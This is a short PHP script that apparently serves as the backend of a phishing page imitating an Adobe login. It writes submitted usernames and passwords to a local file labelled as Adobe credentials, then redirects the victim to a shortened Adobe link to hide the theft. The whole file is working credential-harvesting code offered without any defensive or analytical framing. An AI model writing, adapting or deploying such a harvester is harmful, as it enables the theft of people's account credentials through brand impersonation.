<?php

file_put_contents("../userpass/usernames.txt", "Adobe Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.ly/2OE9ZKL');
exit();
?>
